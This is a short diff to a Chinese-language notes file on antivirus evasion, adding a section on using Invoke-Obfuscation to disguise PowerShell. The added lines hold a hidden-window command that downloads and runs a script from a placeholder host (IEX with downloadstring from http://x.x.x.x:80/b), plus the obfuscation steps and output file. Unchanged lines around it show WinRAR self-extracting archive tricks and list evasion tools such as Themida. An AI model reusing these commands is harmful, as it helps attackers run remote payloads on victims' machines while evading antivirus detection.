@@ -17,5 +17,18 @@ WinRAR a -sfx -iicond:\app.ico setup.exe
 winrar a -v360 1 -sfx  # 360k分卷
 WinRAR a -sfxWinCon.SFX Gift.rar
 ```
+
+## Invoke-Obfuscation 制作 powershell免杀
+```bash
+# https://github.com/danielbohannon/Invoke-Obfuscation
+Import-Module .\Invoke-Obfuscation.psd1;Invoke-Obfuscation
+Invoke-Obfuscation
+set scriptblock 'powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://x.x.x.x:80/b'))"'
+token\all\1
+# encoding <enter> 1 <enter> ascii混淆
+# encoding\1
+out PowerShellCodeASCII.ps1
+```
+
 # 免杀工具
 1.Themida
